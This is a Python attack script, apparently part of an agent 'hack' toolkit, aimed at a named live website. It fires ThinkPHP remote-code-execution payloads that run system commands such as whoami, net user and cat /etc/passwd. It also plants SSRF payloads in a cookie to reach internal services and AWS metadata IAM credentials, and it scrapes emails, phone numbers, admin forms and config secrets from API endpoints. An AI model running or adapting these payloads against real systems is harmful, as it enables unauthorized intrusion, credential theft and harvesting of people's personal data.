#!/usr/bin/env python3
"""Verify ThinkPHP RCE and SSRF — extract actual response content."""
import sys, re
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
sys.stderr.reconfigure(encoding='utf-8', errors='replace')
sys.path.insert(0, r"C:\Users\97912\.codex\skills\hack\scripts")
from cdp_launch import connect_playwright_cdp

BASE = "https://jgy09.com"
PORT = 9222

browser, pw = connect_playwright_cdp(port=PORT, stealth=True)
ctx = browser.contexts[0]

print("="*60)
print("  RCE / SSRF VERIFICATION")
print("="*60)

# ============ 1. Verify ThinkPHP RCE ============
print("\n[*] === ThinkPHP RCE Verification ===")

# Baseline
resp_base = ctx.request.get(BASE + "/", timeout=15000)
base_body = resp_base.text()

rce_tests = [
    ("phpinfo", "/index.php?s=index/\\think\\Request/input&filter=phpinfo&data=1"),
    ("system whoami", "/index.php?s=index/\\think\\Request/input&filter=system&data=whoami"),
    ("system id", "/index.php?s=index/\\think\\Request/input&filter=system&data=id"),
    ("system ipconfig", "/index.php?s=index/\\think\\Request/input&filter=system&data=ipconfig"),
    ("system hostname", "/index.php?s=index/\\think\\Request/input&filter=system&data=hostname"),
    ("system net user", "/index.php?s=index/\\think\\Request/input&filter=system&data=net+user"),
    ("system dir C:\\", "/index.php?s=index/\\think\\Request/input&filter=system&data=dir+C:\\"),
    ("system ls -la", "/index.php?s=index/\\think\\Request/input&filter=system&data=ls+-la"),
    ("system cat /etc/passwd", "/index.php?s=index/\\think\\Request/input&filter=system&data=cat+/etc/passwd"),
    ("system uname -a", "/index.php?s=index/\\think\\Request/input&filter=system&data=uname+-a"),
    # invokefunction variant
    ("invoke phpinfo", "/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"),
    ("invoke system whoami", "/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami"),
    # captcha variant
    ("captcha system whoami", "/index.php?s=captcha&test=-1&_=1&filter=system&method=GET&get[]=whoami"),
    ("captcha system id", "/index.php?s=captcha&test=-1&_=1&filter=system&method=GET&get[]=id"),
]

for label, path in rce_tests:
    url = BASE + path
    try:
        resp = ctx.request.get(url, timeout=15000)
        if not resp:
            continue
        body = resp.text()
        body_len = len(body)
        
        # RCE indicators
        rce_evidence = []
        
        # whoami output: typically a short string like "administrator" or "root"
        if "whoami" in label:
            # Look for typical whoami output
            matches = re.findall(r'(?:^|\n)([\w\.\-]+\\[\w\.\-]+|[\w]+)\s*(?:\n|$)', body)
            for m in matches:
                if m not in base_body and len(m) < 50 and m not in ["script", "html", "body", "head"]:
                    rce_evidence.append(f"possible whoami output: '{m}'")
        
        # id output: uid= gid= groups=
        if "id" in label and "system" in label:
            id_match = re.search(r'uid=\d+\([^)]+\)\s+gid=\d+', body)
            if id_match:
                rce_evidence.append(f"ID OUTPUT: {id_match.group()}")
        
        # phpinfo
        if "phpinfo" in label:
            if "PHP Version" in body and "phpinfo" not in base_body:
                ver = re.search(r'PHP Version\s*(=>?\s*)?([\d.]+)', body)
                rce_evidence.append(f"PHPINFO: version={ver.group(2) if ver else '?'}")
            if "php_uname" in body or "DOCUMENT_ROOT" in body or "SERVER_ADDR" in body:
                rce_evidence.append("PHPINFO: env vars detected")
            if "_SERVER" in body or "Configuration File" in body:
                rce_evidence.append("PHPINFO: config detected")
        
        # /etc/passwd
        if "passwd" in label:
            if "root:x:0:0:" in body or "root::0:0:" in body:
                rce_evidence.append("CRITICAL: /etc/passwd content found!")
        
        # hostname
        if "hostname" in label:
            hostname_match = re.findall(r'(?:^|\n)([a-zA-Z0-9\-]{3,30})\s*(?:\n|$)', body)
            for h in hostname_match:
                if h not in base_body and h not in ["script", "function", "return", "var", "split"]:
                    rce_evidence.append(f"possible hostname: {h}")
        
        # Windows commands
        if "ipconfig" in label:
            if "Windows IP Configuration" in body or "IPv4 Address" in body:
                rce_evidence.append("CRITICAL: Windows ipconfig output!")
        if "net user" in label:
            if "User accounts for" in body or "Administrator" in body:
                rce_evidence.append("CRITICAL: Windows net user output!")
        if "dir" in label and "C:" in label:
            if "Volume in drive" in body or "Directory of" in body:
                rce_evidence.append("CRITICAL: Windows dir output!")
        
        # Linux commands
        if "uname" in label:
            if "Linux" in body and "kernel" in body.lower():
                uname_match = re.search(r'Linux\s+\S+\s+\S+\s+\S+\s+\S+\s+\S+', body)
                if uname_match:
                    rce_evidence.append(f"UNAME: {uname_match.group()}")
        if "ls" in label:
            if "drwx" in body or "-rw-" in body or "total " in body:
                rce_evidence.append("CRITICAL: ls output (file permissions) found!")
        
        # Check if response is completely different from baseline
        if body_len < 64000 and body_len > 100:
            if not any(k in body for k in ["百度", "baidu", "defConfig"]):
                rce_evidence.append(f"Non-standard response ({body_len}b)")
        
        if rce_evidence:
            print(f"\n  [!!!] {label}: RCE INDICATORS FOUND!")
            for ev in rce_evidence:
                print(f"    -> {ev}")
            # Save response
            safe_name = label.replace(" ", "_").replace("\\", "_")
            with open(f"C:\\Users\\97912\\Desktop\\实验二号\\rce_{safe_name}.html", "w", encoding="utf-8") as f:
                f.write(body)
            print(f"    Response saved to rce_{safe_name}.html")
        else:
            print(f"  [{body_len}b] {label} — no RCE indicators")
            
    except Exception as e:
        print(f"  [ERROR] {label}: {str(e)[:80]}")

# ============ 2. Verify SSRF — fetch internal services ============
print("\n\n[*] === SSRF Verification — Internal Service Fetching ===")

ssrf_tests = [
    ("backend1 http", 'a:1:{s:3:"url";s:24:"http://43.248.139.40:80/";}', "http://43.248.139.40:80/"),
    ("backend2 http", 'a:1:{s:3:"url";s:28:"http://103.39.222.193:8001/";}', "http://103.39.222.193:8001/"),
    ("localhost", 'a:1:{s:3:"url";s:17:"http://127.0.0.1/";}', "http://127.0.0.1/"),
    ("localhost 5044", 'a:1:{s:3:"url";s:22:"http://127.0.0.1:5044/";}', "http://127.0.0.1:5044/"),
    ("AWS meta", 'a:1:{s:3:"url";s:26:"http://169.254.169.254/";}', "http://169.254.169.254/"),
    ("AWS meta2", 'a:1:{s:3:"url";s:52:"http://169.254.169.254/latest/meta-data/iam/security-credentials/";}', "AWS creds"),
    ("Redis probe", 'a:1:{s:3:"url";s:28:"http://127.0.0.1:6379/INFO";}', "Redis"),
    ("MongoDB probe", 'a:1:{s:3:"url";s:24:"http://127.0.0.1:27017/";}', "MongoDB"),
    ("ES probe", 'a:1:{s:3:"url";s:28:"http://127.0.0.1:9200/_cluster/health";}', "Elasticsearch"),
]

for label, payload, target in ssrf_tests:
    resp = ctx.request.get(BASE + "/", timeout=15000,
        headers={"Cookie": f"tracking={payload}"})
    if not resp:
        continue
    body = resp.text()
    body_len = len(body)
    
    ssrf_evidence = []
    
    # Check if target content appeared in response
    if target == "http://43.248.139.40:80/":
        if "域名未备案" in body and "域名未备案" not in base_body:
            ssrf_evidence.append("Backend HTTP content fetched!")
    elif target == "http://103.39.222.193:8001/":
        if "恭喜" in body and "站点创建成功" in body:
            ssrf_evidence.append("Backend2 content fetched!")
    elif "169.254" in target:
        if "ami-" in body or "instance-id" in body or "iam" in body.lower():
            ssrf_evidence.append("AWS METADATA FETCHED!")
        if "AccessKeyId" in body or "SecretAccessKey" in body:
            ssrf_evidence.append("AWS CREDENTIALS LEAKED!")
    elif "Redis" in target:
        if "redis_version" in body.lower():
            ssrf_evidence.append("Redis info fetched!")
    elif "Elasticsearch" in target:
        if "cluster_name" in body or "number_of_nodes" in body:
            ssrf_evidence.append("Elasticsearch data fetched!")
    
    # Check for new unique content
    unique_lines = set(body.split('\n')) - set(base_body.split('\n'))
    unique_count = len(unique_lines)
    
    if ssrf_evidence:
        print(f"\n  [!!!] {label}: SSRF CONFIRMED!")
        for ev in ssrf_evidence:
            print(f"    -> {ev}")
        # Save response
        with open(f"C:\\Users\\97912\\Desktop\\实验二号\\ssrf_{label.replace(' ','_')}.html", "w", encoding="utf-8") as f:
            f.write(body)
    else:
        print(f"  [{body_len}b, {unique_count} new lines] {label}")

# ============ 3. Extract content from ThinkPHP API responses ============
print("\n\n[*] === ThinkPHP API Content Analysis ===")
# The /api/user/info endpoint returned 131830 bytes — extract content
resp = ctx.request.get(BASE + "/index.php?s=/api/user/info", timeout=15000)
if resp:
    body = resp.text()
    print(f"  /api/user/info: {len(body)} bytes")
    # Look for user data
    if "tommaso" in body.lower():
        print(f"  [!] Username 'tommaso' found in API response!")
        idx = body.lower().index("tommaso")
        print(f"  Context: {body[max(0,idx-100):idx+200]}")
    # Look for JSON data
    json_blocks = re.findall(r'\{[^{}]{5,300}\}', body)
    for block in json_blocks[:10]:
        if any(k in block.lower() for k in ["user", "name", "email", "phone", "id", "token", "admin"]):
            print(f"  [JSON] {block[:200]}")
    # Look for emails
    emails = re.findall(r'[\w.+-]+@[\w-]+\.[\w.-]+', body)
    if emails:
        print(f"  Emails: {list(set(emails))[:5]}")
    # Look for phone numbers
    phones = re.findall(r'1[3-9]\d{9}', body)
    if phones:
        print(f"  Phones: {list(set(phones))[:5]}")

# /admin/login
resp = ctx.request.get(BASE + "/index.php?s=/admin/login", timeout=15000)
if resp:
    body = resp.text()
    print(f"\n  /admin/login: {len(body)} bytes")
    forms = re.findall(r'<form[^>]*action=["\']([^"\']*)["\'][^>]*method=["\']([^"\']*)["\']', body, re.I)
    inputs = re.findall(r'<input[^>]*name=["\']([^"\']*)["\'][^>]*type=["\']([^"\']*)["\']', body, re.I)
    print(f"  Forms: {forms}")
    print(f"  Inputs: {inputs}")
    if "admin" in body.lower():
        # Extract admin-related content
        admin_sections = re.findall(r'(?:admin|manage|后台|管理)[^<]{0,100}', body, re.I)
        if admin_sections:
            print(f"  Admin sections: {admin_sections[:5]}")

# /api/config
resp = ctx.request.get(BASE + "/index.php?s=/api/config", timeout=15000)
if resp:
    body = resp.text()
    print(f"\n  /api/config: {len(body)} bytes")
    # Look for config data
    configs = re.findall(r'(?:config|db|password|key|secret|api)["\']?\s*[:=]\s*["\']([^"\']{3,50})["\']', body, re.I)
    if configs:
        print(f"  Config values: {configs[:10]}")
    # Look for database connection strings
    db_matches = re.findall(r'(?:mysql|mysqli|pdo)[^\s"]{10,100}', body, re.I)
    if db_matches:
        print(f"  DB refs: {db_matches[:3]}")

print("\n[*] Verification complete.")
